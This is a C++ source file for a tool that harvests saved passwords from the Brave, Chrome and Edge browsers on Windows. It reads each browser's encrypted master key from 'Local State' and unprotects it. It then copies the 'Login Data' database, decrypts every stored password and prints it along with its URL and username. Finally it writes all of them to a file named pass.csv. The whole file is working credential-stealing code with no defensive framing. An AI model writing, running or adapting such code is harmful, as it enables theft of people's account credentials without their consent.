#include "pch.hpp"
#include "main.hpp"

#include <filesystem>

#ifdef KTN_PLATFORM_WINDOWS
#include <Windows.h>
#include <ShlObj.h>
#endif

#include "aesdecrypt.hpp"

#include "SQLiteCpp/SQLiteCpp.h"

namespace Penkr
{
    namespace Utils
    {
        static std::filesystem::path GetDataDirectory()
        {
            std::filesystem::path result;
#ifdef KTN_PLATFORM_WINDOWS
            PWSTR path;

            auto wResult = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &path);

            if (wResult != S_OK)
            {
                CoTaskMemFree(path);
                return "";
            }

            result = path;
            CoTaskMemFree(path);
#else
    #error "Not supported!"
#endif

            return result;
        }
    }

    static std::vector<std::filesystem::path> Directories = {
        std::filesystem::path("BraveSoftware") / "Brave-Browser",
        std::filesystem::path("Google") / "Chrome",
        std::filesystem::path("Microsoft") / "Edge"
    };

    static bool GetAbsolutePath(std::filesystem::path directory, std::filesystem::path& userDataResult, std::filesystem::path& defaultResult)
    {
        auto local = Utils::GetDataDirectory();
        auto userDataDir = local / directory / "User Data";
        auto defaultDir = userDataDir / "Default";

        if (!std::filesystem::exists(defaultDir) || !std::filesystem::is_directory(defaultDir))
        {
            std::cout << "Directory does not exist:\n" << defaultDir.string() << "\n\n";
            return false;
        }

        userDataResult = userDataDir;
        defaultResult = defaultDir;

        return true;
    }

    static std::string ReadFile(std::filesystem::path file)
    {
        std::string result;
        std::ifstream in(file, std::ios::in | std::ios::binary);
        if (in)
        {
            in.seekg(0, std::ios::end);
            result.resize(in.tellg());
            in.seekg(0, std::ios::beg);
            in.read(&result[0], result.size());
            in.close();
        }
        else
        {
            std::cout << "File does not exist: " << file << "\n";
        }
        
        return result;
    }

    static void strreplace(std::string& str, const std::string& from, const std::string& to)
    {
        if (from.empty()) return;

        size_t start_pos = 0;
        while ((start_pos = str.find(from, start_pos)) != std::string::npos)
        {
            str.replace(start_pos, from.length(), to);
            start_pos += to.length();
        }
    }

    class CsvPass
    {
    public:
        CsvPass(std::filesystem::path fileName)
            : m_FileName(fileName), m_Index(0)
        {
            if (std::filesystem::exists(fileName)) std::filesystem::remove(fileName);

            m_Stream.open(fileName.string(), std::ios::out | std::ios::binary);
            m_Stream << "index,url,username,password\n";
        }

        bool good() const
        {
            return m_Stream.is_open();
        }

        void Next(const std::string& url, const std::string& userName, const std::string& pass)
        {
            m_Stream << m_Index << "," << encode(url) << "," << userName << "," << pass << "\n";
            m_Index++;
        }

        std::string encode(const std::string& str)
        {
            std::string result = str;
            strreplace(result, ",", "%2C");
            return result;
        }

    private:
        std::filesystem::path m_FileName;
        std::ofstream m_Stream;
        int m_Index;
    };

    static const char* GetPassFile()
    {
        return "pass.csv";
    }

    int Clear()
    {
        std::filesystem::path passFile = GetPassFile();
        if (std::filesystem::exists(passFile))
            std::filesystem::remove(passFile);            
    }

    int Main(int _argc, char** _argv)
    {
        CsvPass csv(GetPassFile());

        for (const auto& dir : Directories)
        {
            std::filesystem::path userDataDir, defaultDir;
            if (!GetAbsolutePath(dir, userDataDir, defaultDir)) continue;

            std::filesystem::path userFile = userDataDir / "Local State";
            std::string data = ReadFile(userFile);
            auto pos = data.find("encrypted_key");
            if (pos == std::string::npos)
            {
                std::cout << "Failed to find encrypted key!\n";
                continue;
            }
            pos += 16;
            auto endPos = data.find('"', pos);
            if (endPos == std::string::npos)
            {
                std::cout << "Error\n";
                continue;
            }

            std::string key = data.substr(pos, endPos - pos);
            key = AES::Base64Decode(key);
            key = key.substr(5);
            key = AES::Unprotect(key);
            
            std::cout << dir.string() << ":\n";

            std::filesystem::path dbFile = defaultDir / "Login Data";

            std::filesystem::path localDbFile = "data.db";

            if (std::filesystem::exists(localDbFile))
                std::filesystem::remove(localDbFile);
            std::filesystem::copy_file(dbFile, localDbFile);

            try
            {
                SQLite::Database db(localDbFile.string());

                SQLite::Statement query(db, "SELECT action_url, username_value, password_value FROM logins");

                while (query.executeStep())
                {
                    const char* url = query.getColumn(0);
                    const char* username = query.getColumn(1);
                    const char* cipher = query.getColumn(2);

                    std::string password = AES::DecryptAES(cipher, key);

                    if (password.empty()) continue;

                    std::cout << "url: " << url << "\nname: " << username << "\ncipher: " << password << "\n\n";


                    csv.Next(url, username, password);
                }

            }
            catch (std::exception& e)
            {
                std::cout << "SQL Error: " << e.what() << "\n";
            }

            std::filesystem::remove(localDbFile);

        }

        return 0;
    }
}